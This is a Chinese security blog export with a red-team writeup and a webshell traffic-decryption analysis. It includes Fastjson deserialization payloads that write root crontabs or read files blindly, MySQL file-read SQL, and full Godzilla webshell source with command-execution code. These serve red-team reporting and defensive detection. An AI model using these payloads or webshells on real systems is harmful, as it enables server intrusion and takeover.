  笔者在vps用jar起的环境和本地手动创建classes目录之后都是可以成功的。

  但是打的站没成功，别的师傅通过别的链打下来后，笔者上去看了下class文件没问题，也能直接运行，但是很奇怪用fastjson加载不了。
最后  在root权限下可以直接通过commons-io链写计划任务，低权限下通过写class文件rce，获取jdk目录、创建classes目录仅依赖commons-io，但是写入class文件需要更多不太常见的依赖，总的来讲利用条件还是较为苛刻的。
参考

Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析(https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg)
Blackhat 2021 议题详细分析 —— FastJson 反序列化漏洞及在区块链应用中的渗透利用(https://paper.seebug.org/1698/#3commons-io)
fastjson 读文件 gadget 的利用场景扩展(https://b1ue.cn/archives/506.html)
JDK8任意文件写场景下的Fastjson RCE(https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/)


]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>一次攻防小记</title>
    <url>//post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html</url>
    <content><![CDATA[一次攻防小记​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。
fastjson利用随手一试fastjson jdk8 写文件的链
{ "x":{
        "@type":"java.lang.AutoCloseable", 
        "@type":"sun.rmi.server.MarshalOutputStream",
        "out":{
            "@type":"java.util.zip.InflaterOutputStream",
            "out":{
                "@type":"java.io.FileOutputStream",
                "file":"/var/spool/cron/crontabs/root",
                "append":false
            },
            "infl":{
                "input":"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL"
            },
            "bufLen":1048576
        },
        "protocolVersion":1
    }}

压缩数据生成
from itsdangerous import base64_decode, base64_encode
import zlib
cc='hello'.encode()
ccc=zlib.compress(cc)
print(base64_encode(ccc))

居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///tmp/"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [
          ...
        ]
      }
    ]
  },
  "address" : {"$ref":"$.abc.BOM"}
}

但是没有回显，无法判断，随后拜读浅蓝师傅的文章 https://b1ue.cn/archives/506.html
前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件
通过读/root/.bash_history等拿到tomcat路径
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///tmp/test"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [
          98
        ]
      }
    ]
  },
  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}
}

但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。
写计划任务试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。
SQL注入fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 https://xz.aliyun.com/t/7169#toc-32
drop table mysql.m1;
CREATE TABLE mysql.m1 (code TEXT );
LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
select * from mysql.m1;

可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。
二战过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 
"@type":"xxxx"

一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Webshell工具加密流量解析</title>
    <url>//post/Webshell%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E8%A7%A3%E6%9E%90.html</url>
    <content><![CDATA[前言webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯拉、冰蝎3.0这三款较为流行的工具在默认情况下的流量加密方式和解密方法，可以帮助守方在复盘时更好的攻击链还原和检测。
蚁剑蚁剑的加密手段比较简单，在配置界面的加密手段只有base64和rot13，这两者都是无需密钥可直接进行解密的密码类型，这里以base64为例：提取参数后的编码直接进行base64解码：
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb3BhcnI9cHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkb3BkaXIpOyRvY3dkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskdG1kaXI9Ii45ZjFlN2ZjODYiO0Bta2RpcigkdG1kaXIpO0BjaGRpcigkdG1kaXIpO0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIuLiIpO2ZvcigkaT0wOyRpPHNpemVvZigkb3BhcnIpOyRpKyspe0BjaGRpcigiLi4iKTt9QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJG9jd2QuIi8iLiR0bWRpcik7fTtmdW5jdGlvbiBhc2VuYygkb3V0KXtyZXR1cm4gQGJhc2U2NF9lbmNvZGUoJG91dCk7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiMzU4ZGMiLiI1MjQyYiI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiNzkiLiJlNTUiO31vYl9zdGFydCgpO3RyeXtwaHBpbmZvKCk7CmVjaG8gImtpZCIKCjt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7

解密内容：
@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$oparr=preg_split("/\\\\|\//",$opdir);$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$tmdir=".9f1e7fc86";@mkdir($tmdir);@chdir($tmdir);@ini_set("open_basedir","..");for($i=0;$i&lt;sizeof($oparr);$i++){@chdir("..");}@ini_set("open_basedir","/");@rmdir($ocwd."/".$tmdir);};function asenc($out){return @base64_encode($out);};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "358dc"."5242b";echo @asenc($output);echo "79"."e55";}ob_start();try{phpinfo();
echo "kid"

;}catch(Exception $e){echo "ERROR://".$e-&gt;getMessage();};asoutput();die();

哥斯拉哥斯拉自带了几种加密方式，这里以php为例：分别为PHP_EVEAL_XOR_BASE64、PHP_XOR_BASE64、PHP_XOR_RAW为例。
PHP_XOR_BASE64这个用哥斯拉生成的shell：
&lt;?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i&lt;strlen($D);$i++) {
        $c = $K[$i+1&amp;15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){

        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            echo($payload);


            $payload=encode($payload,$key);
        }
        eval($payload);

        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}

根据shell文件可以看出加密过程，先将pass传递内容base64解码，然后将内容与key进行异或操做，注意这里的key实际上是生成shell的key的32位md5的前16位。那么我们根据这些即可写一个一次性的解码脚本，用第一次哥斯拉进行流量交互的payload为例（这里的key值为key）：将内容url解码后放入脚本中脚本如下：
&lt;?php 
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i&lt;strlen($D);$i++) {
        $c = $K[$i+1&amp;15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';


$post = "";
#echo base64_decode($post);
echo "&lt;br/&gt;";
echo "&lt;br/&gt;";

$data=encode(base64_decode($post),$key);
echo $data;


解密结果如下：
$parameters=array(); $_SES=array(); function run($pms){ global $ERRMSG; reDefSystemFunc(); $_SES=&amp;getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } @session_write_close(); if (canCallGzipDecode()==1&amp;&amp;@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if (isset($_SES["bypass_open_basedir"])&amp;&amp;$_SES["bypass_open_basedir"]==true){ @bypass_open_basedir(); } if (function_existsEx("set_error_handler")){ @set_error_handler("payloadErrorHandler"); } if (function_existsEx("set_exception_handler")){ @set_exception_handler("payloadExceptionHandler"); } $result=@evalFunc(); if ($result==null||$result===false){ $result=$ERRMSG; } if ($_SES!==null){ session_start(); $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId)); @session_write_close(); } if (canCallGzipEncode()){ $result=gzencode($result,6); } return $result; } function payloadExceptionHandler($exception){ global $ERRMSG; $ERRMSG.="ExceptionMsg:".$exception-&gt;getMessage()."\r\n"; return true; } function payloadErrorHandler($errno, $errstr, $errfile=null, $errline=null,$errcontext=null){ global $ERRMSG; $ERRMSG.="ErrLine: {$errline} ErrorMsg:{$errstr}\r\n"; return true; } function S1MiwYYr($D,$K){ for($i=0;$istrlen($pms)-1){ break; } } } function evalFunc(){ @session_write_close(); $className=get("codeName"); $methodName=get("methodName"); $_SES=&amp;getSession(); if ($methodName!=null){ if (strlen(trim($className))&gt;0){ if ($methodName=="includeCode"){ return includeCode(); }else{ if (isset($_SES[$className])){ return eval($_SES[$className]); }else{ return "{$className} no load"; } } }else{ if (function_exists($methodName)){ return $methodName(); }else{ return "function {$methodName} not exist"; } } }else{ return "methodName Is Null"; } } function deleteDir($p){ $m=@dir($p); while(@$f=$m-&gt;read()){ $pf=$p."/".$f; @chmod($pf,0777); if((is_dir($pf))&amp;&amp;($f!=".")&amp;&amp;($f!="..")){ deleteDir($pf); @rmdir($pf); }else if (is_file($pf)&amp;&amp;($f!=".")&amp;&amp;($f!="..")){ @unlink($pf); } } $m-&gt;close(); @chmod($p,0777); return @rmdir($p); } function deleteFile(){ $F=get("fileName"); if(is_dir($F)){ return deleteDir($F)?"ok":"fail"; }else{ return (file_exists($F)?@unlink($F)?"ok":"fail":"fail"); } } function setFileAttr(){ $type = get("type"); $attr = get("attr"); $fileName = get("fileName"); $ret = "Null"; if ($type!=null&amp;&amp;$attr!=null&amp;&amp;$fileName!=null) { if ($type=="fileBasicAttr"){ if (@chmod($fileName,convertFilePermissions($attr))){ return "ok"; }else{ return "fail"; } }else if ($type=="fileTimeAttr"){ if (@touch($fileName,$attr)){ return "ok"; }else{ return "fail"; } }else{ return "no ExcuteType"; } }else{ $ret="type or attr or fileName is null"; } return $ret; } function fileRemoteDown(){ $url=get("url"); $saveFile=get("saveFile"); if ($url!=null&amp;&amp;$saveFile!=null) { $data=@file_get_contents($url); if ($data!==false){ if (@file_put_contents($saveFile,$data)!==false){ @chmod($saveFile,0777); return "ok"; }else{ return "write fail"; } }else{ return "read fail"; } }else{ return "url or saveFile is null"; } } function copyFile(){ $srcFileName=get("srcFileName"); $destFileName=get("destFileName"); if (@is_file($srcFileName)){ if (copy($srcFileName,$destFileName)){ return "ok"; }else{ return "fail"; } }else{ return "The target does not exist or is not a file"; } } function moveFile(){ $srcFileName=get("srcFileName"); $destFileName=get("destFileName"); if (rename($srcFileName,$destFileName)){ return "ok"; }else{ return "fail"; } } function getBasicsInfo() { $data = array(); $data['OsInfo'] = @php_uname(); $data['CurrentUser'] = @get_current_user(); $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) &gt; 0 ? $data['CurrentUser'] : 'NULL'; $data['REMOTE_ADDR'] = @$_SERVER['REMOTE_ADDR']; $data['REMOTE_PORT'] = @$_SERVER['REMOTE_PORT']; $data['HTTP_X_FORWARDED_FOR'] = @$_SERVER['HTTP_X_FORWARDED_FOR']; $data['HTTP_CLIENT_IP'] = @$_SERVER['HTTP_CLIENT_IP']; $data['SERVER_ADDR'] = @$_SERVER['SERVER_ADDR']; $data['SERVER_NAME'] = @$_SERVER['SERVER_NAME']; $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT']; $data['disable_functions'] = @ini_get('disable_functions'); $data['disable_functions'] = strlen(trim($data['disable_functions'])) &gt; 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions'); $data['Open_basedir'] = @ini_get('open_basedir'); $data['timezone'] = @ini_get('date.timezone'); $data['encode'] = @ini_get('exif.encode_unicode'); $data['extension_dir'] = @ini_get('extension_dir'); $tmpDir=sys_get_temp_dir(); $separator=substr($tmpDir,strlen($tmpDir)-1,1); if ($separator!='\\'&amp;&amp;$separator!='/'){ $tmpDir=$tmpDir.'/'; } $data['systempdir'] = $tmpDir; $data['include_path'] = @ini_get('include_path'); $data['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT']; $data['PHP_SAPI'] = PHP_SAPI; $data['PHP_VERSION'] = PHP_VERSION; $data['PHP_INT_SIZE'] = PHP_INT_SIZE; $data['ProcessArch'] = PHP_INT_SIZE==8?"x64":"x86"; $data['PHP_OS'] = PHP_OS; $data['canCallGzipDecode'] = canCallGzipDecode(); $data['canCallGzipEncode'] = canCallGzipEncode(); $data['session_name'] = @ini_get("session.name"); $data['session_save_path'] = @ini_get("session.save_path"); $data['session_save_handler'] = @ini_get("session.save_handler"); $data['session_serialize_handler'] = @ini_get("session.serialize_handler"); $data['user_ini_filename'] = @ini_get("user_ini.filename"); $data['memory_limit'] = @ini_get('memory_limit'); $data['upload_max_filesize'] = @ini_get('upload_max_filesize'); $data['post_max_size'] = @ini_get('post_max_size'); $data['max_execution_time'] = @ini_get('max_execution_time'); $data['max_input_time'] = @ini_get('max_input_time'); $data['default_socket_timeout'] = @ini_get('default_socket_timeout'); $data['mygid'] = @getmygid(); $data['mypid'] = @getmypid(); $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE']; $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT']; $data['loaded_extensions'] = @implode(',', @get_loaded_extensions()); $data['short_open_tag'] = @get_cfg_var('short_open_tag'); $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false'; $data['asp_tags'] = @get_cfg_var('asp_tags'); $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false'; $data['safe_mode'] = @get_cfg_var('safe_mode'); $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false'; $data['CurrentDir'] = str_replace('\\', '/', @dirname($_SERVER['SCRIPT_FILENAME'])); if (strlen(trim($data['CurrentDir']))==0){ $data['CurrentDir'] = str_replace('\\', '/', @dirname(__FILE__)); } $SCRIPT_FILENAME=@dirname(__FILE__); $data['FileRoot'] = ''; if (substr($SCRIPT_FILENAME, 0, 1) != '/') { $drivers=array('C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'); foreach ($drivers as $L){ if (@is_dir("{$L}:/")){ $data['FileRoot'] .= "{$L}:/;";} } if (empty($data['FileRoot'])){ $data['FileRoot']=substr($SCRIPT_FILENAME,0,3); } }else{ $data['FileRoot'] .= "/"; } $result=""; foreach($data as $key=&gt;$value){ $result.=$key." : ".$value."\n"; } return $result; } function getFile(){ $dir=get('dirName'); $dir=(strlen(@trim($dir))&gt;0)?trim($dir):str_replace('\\','/',dirname(__FILE__)); $dir.="/"; $path=$dir; $allFiles = @scandir($path); $data=""; if ($allFiles!=null){ $data.="ok"; $data.="\n"; $data.=$path; $data.="\n"; foreach ($allFiles as $fileName) { if ($fileName!="."&amp;&amp;$fileName!=".."){ $fullPath = $path.$fileName; $lineData=array(); array_push($lineData,$fileName); array_push($lineData,@is_file($fullPath)?"1":"0"); array_push($lineData,date("Y-m-d H:i:s", @filemtime($fullPath))); array_push($lineData,@filesize($fullPath)); $fr=(@is_readable($fullPath)?"R":"").(@is_writable($fullPath)?"W":"").(@is_executable($fullPath)?"X":""); array_push($lineData,(strlen($fr)&gt;0?$fr:"F")); $data.=(implode("\t",$lineData)."\n"); } } }else{ return "Path Not Found Or No Permission!"; } return $data; } function readFileContent(){ $fileName=get("fileName"); if (@is_file($fileName)){ if (function_existsEx("is_readable")){ return file_get_contents($fileName); }else{ return "No Permission!"; } }else{ return "File Not Found"; } } function uploadFile(){ $fileName=get("fileName"); $fileValue=get("fileValue"); if (@file_put_contents($fileName,$fileValue)!==false){ @chmod($fileName,0777); return "ok"; }else{ return "fail"; } } function newDir(){ $dir=get("dirName"); if (@mkdir($dir,0777,true)!==false){ return "ok"; }else{ return "fail"; } } function newFile(){ $fileName=get("fileName"); if (@file_put_contents($fileName,"")!==false){ return "ok"; }else{ return "fail"; } } function function_existsEx($functionName){ $d=explode(",",@ini_get("disable_functions")); if(empty($d)){ $d=array(); }else{ $d=array_map('trim',array_map('strtolower',$d)); } return(function_exists($functionName)&amp;&amp;is_callable($functionName)&amp;&amp;!in_array($functionName,$d)); } function execCommand(){ @ob_start(); $cmdLine=get("cmdLine"); if(substr(__FILE__,0,1)=="/"){ @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"); }else{ @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"); } $result=""; if (!function_existsEx("runshellshock")){ function runshellshock($d, $c) { if (substr($d, 0, 1) == "/" &amp;&amp; function_existsEx('putenv') &amp;&amp; (function_existsEx('error_log') || function_existsEx('mail'))) { if (strstr(readlink("/bin/sh"), "bash") != FALSE) { $tmp = tempnam(sys_get_temp_dir(), 'as'); putenv("PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1"); if (function_existsEx('error_log')) { error_log("a", 1); } else { mail("a@127.0.0.1", "", "", "-bv"); } } else { return False; } $output = @file_get_contents($tmp); @unlink($tmp); if ($output != "") { return $output; } } return False; }; } if(function_existsEx('system')){ @system($cmdLine,$ret); }elseif(function_existsEx('passthru')){ $result=@passthru($cmdLine,$ret); }elseif(function_existsEx('shell_exec')){ $result=@shell_exec($cmdLine); }elseif(function_existsEx('exec')){ @exec($cmdLine,$o,$ret); $result=join("\n",$o); }elseif(function_existsEx('popen')){ $fp=@popen($cmdLine,'r'); while(!@feof($fp)){ $result.=@fgets($fp,1024*1024); } @pclose($fp); }elseif(function_existsEx('proc_open')){ $p = @proc_open($cmdLine, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io); while(!@feof($io[1])){ $result.=@fgets($io[1],1024*1024); } while(!@feof($io[2])){ $result.=@fgets($io[2],1024*1024); } @fclose($io[1]); @fclose($io[2]); @proc_close($p); }elseif(substr(__FILE__,0,1)!="/" &amp;&amp; @class_exists("COM")){ $w=new COM('WScript.shell'); $e=$w-&gt;exec($cmdLine); $so=$e-&gt;StdOut(); $result.=$so-&gt;ReadAll(); $se=$e-&gt;StdErr(); $result.=$se-&gt;ReadAll(); }elseif (function_existsEx("pcntl_fork")&amp;&amp;function_existsEx("pcntl_exec")){ $cmd="/bin/bash"; if (!file_exists($cmd)){ $cmd="/bin/sh"; } $commandFile=sys_get_temp_dir()."/".time().".log"; $resultFile=sys_get_temp_dir()."/".(time()+1).".log"; @file_put_contents($commandFile,$cmdLine); switch (pcntl_fork()) { case 0: $args = array("-c", "$cmdLine &gt; $resultFile"); pcntl_exec($cmd, $args); // the child will only reach this point on exec failure, // because execution shifts to the pcntl_exec()ed command exit(0); default: break; } if (!file_exists($resultFile)){ sleep(2); } $result=file_get_contents($resultFile); @unlink($commandFile); @unlink($resultFile); }elseif(($result=runshellshock(__FILE__, $cmdLine)!==false)) { }else{ return "none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available"; } $result .= @ob_get_contents(); @ob_end_clean(); return $result; } function execSql(){ $dbType=get("dbType"); $dbHost=get("dbHost"); $dbPort=get("dbPort"); $username=get("dbUsername"); $password=get("dbPassword"); $execType=get("execType"); $execSql=get("execSql"); $charset=get("dbCharset"); $currentDb=get("currentDb"); function mysqli_exec($host,$port,$username,$password,$execType,$currentDb,$sql,$charset){ // 创建连接 $conn = new mysqli($host,$username,$password,"",$port); // Check connection if ($conn-&gt;connect_error) { return $conn-&gt;connect_error; } if (!empty($charset)){ $conn-&gt;set_charset($charset); } if (!empty($currentDb)){ $conn-&gt;select_db($currentDb); } $result = $conn-&gt;query($sql); if ($conn-&gt;error){ return $conn-&gt;error; } if ($execType=="update"){ return "Query OK, ".$conn-&gt;affected_rows." rows affected"; }else{ $data="ok\n"; while ($column = $result-&gt;fetch_field()){ $data.=base64_encode($column-&gt;name)."\t"; } $data.="\n"; if ($result-&gt;num_rows &gt; 0) { while($row = $result-&gt;fetch_assoc()) { foreach ($row as $value){ $data.=base64_encode($value)."\t"; } $data.="\n"; } } return $data; } } function mysql_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset) { $con = @mysql_connect($host.":".$port, $username, $password); if (!$con) { return mysql_error(); } else { if (!empty($charset)){ mysql_set_charset($charset,$con); } if (!empty($currentDb)){ if (function_existsEx("mysql_selectdb")){ mysql_selectdb($currentDb,$con); }elseif (function_existsEx("mysql_select_db")){ mysql_select_db($currentDb,$con); } } $result = @mysql_query($sql); if (!$result) { return mysql_error(); } if ($execType == "update") { return "Query OK, ".mysql_affected_rows($con)." rows affected"; } else { $data = "ok\n"; for ($i = 0; $i &lt; mysql_num_fields($result); $i++) { $data.= base64_encode(mysql_field_name($result, $i))."\t"; } $data.= "\n"; $rowNum = mysql_num_rows($result); if ($rowNum &gt; 0) { while ($row = mysql_fetch_row($result)) { foreach($row as $value) { $data.= base64_encode($value)."\t"; } $data.= "\n"; } } } @mysql_close($con); return $data; } } function mysqliEx_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset){ $port == "" ? $port = "3306" : $port; $T=@mysqli_connect($host,$username,$password,"",$port); if (!empty($charset)){ @mysqli_set_charset($charset); } if (!empty($currentDb)){ @mysqli_select_db($T,$currentDb); } $q=@mysqli_query($T,$sql); if(is_bool($q)){ return mysqli_error($T); }else{ if (mysqli_num_fields($q)&gt;0){ $i=0; $data = "ok\n"; while($col=@mysqli_fetch_field($q)){ $data.=base64_encode($col-&gt;name)."\t"; $i++; } $data.="\n"; while($rs=@mysqli_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.="\n"; } return $data; }else{ return "Query OK, ".@mysqli_affected_rows($T)." rows affected"; } } } function pg_execEx($host, $port, $username, $password, $execType,$currentDb, $sql,$charset){ $port == "" ? $port = "5432" : $port; $arr=array( 'host'=&gt;$host, 'port'=&gt;$port, 'user'=&gt;$username, 'password'=&gt;$password ); if (!empty($currentDb)){ $arr["dbname"]=$currentDb; } $cs=''; foreach($arr as $k=&gt;$v) { if(empty($v)){ continue; } $cs .= "$k=$v "; } $T=@pg_connect($cs); if(!$T){ return @pg_last_error(); }else{ if (!empty($charset)){ @pg_set_client_encoding($T,$charset); } $q=@pg_query($T, $sql); if(!$q){ return @pg_last_error(); }else{ $n=@pg_num_fields($q); if($n===NULL){ return @pg_last_error(); }elseif($n===0){ return "Query OK, ".@pg_affected_rows($q)." rows affected"; }else{ $data = "ok\n"; for($i=0;$i&lt;$n;$i++){ $data.=base64_encode(@pg_field_name($q,$i))."\t"; } $data.= "\n"; while($row=@pg_fetch_row($q)){ for($i=0;$i&lt;$n;$i++){ $data.=base64_encode($row[$i]!==NULL?$row[$i]:"NULL")."\t"; } $data.= "\n"; } return $data; } } } } function sqlsrv_exec($host, $port, $username, $password, $execType, $currentDb,$sql){ $dbConfig=array("UID"=&gt; $username,"PWD"=&gt;$password); if (!empty($currentDb)){ $dbConfig["Database"]=$currentDb; } $T=@sqlsrv_connect($host,$dbConfig); $q=@sqlsrv_query($T,$sql,null); if($q!==false){ $i=0; $fm=@sqlsrv_field_metadata($q); if(empty($fm)){ $ar=@sqlsrv_rows_affected($q); return "Query OK, ".$ar." rows affected"; }else{ $data = "ok\n"; foreach($fm as $rs){ $data.=base64_encode($rs['Name'])."\t"; $i++; } $data.= "\n"; while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.= "\n"; } return $data; } }else{ $err=""; if(($e = sqlsrv_errors()) != null){ foreach($e as $v){ $err.=($e['message'])."\n"; } } return $err; } } function mssql_exec($host, $port, $username, $password, $execType,$currentDb, $sql){ $T=@mssql_connect($host,$username,$password); if (!empty($currentDb)){ @mssql_select_db($currentDb); } $q=@mssql_query($sql,$T); if(is_bool($q)){ return "Query OK, ".@mssql_rows_affected($T)." rows affected"; }else{ $data = "ok\n"; $i=0; while($rs=@mssql_fetch_field($q)){ $data.=base64_encode($rs-&gt;name)."\t"; $i++; } $data.="\n"; while($rs=@mssql_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.="\n"; } @mssql_free_result($q); @mssql_close($T); return $data; } } function oci_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $chs = $charset ? $charset : "utf8"; $mod = 0; $H = @oci_connect($username, $password, $host, $chs, $mod); if (!$H) { $errObj=@oci_error(); return $errObj["message"]; } else { $q = @oci_parse($H, $sql); if (@oci_execute($q)) { $n = oci_num_fields($q); if ($n == 0) { return "Query OK, ".@oci_num_rows($q)." rows affected"; } else { $data = "ok\n"; for ($i = 1; $i &lt;= $n; $i++) { $data.= base64_encode(oci_field_name($q, $i))."\t"; } $data.= "\n"; while ($row = @oci_fetch_array($q, OCI_ASSOC + OCI_RETURN_NULLS)) { foreach($row as $item) { $data.= base64_encode($item !== null ? base64_encode($item) : ""). "\t"; } $data.= "\n"; } return $data; } } else { $e = @oci_error($q); if ($e) { return "ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}"; } else { return "false"; } } } } function ora_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $H = @ora_plogon("{$username}@{$host}", "{$password}"); if (!$H) { return "Login Failed!"; } else { $T = @ora_open($H); @ora_commitoff($H); 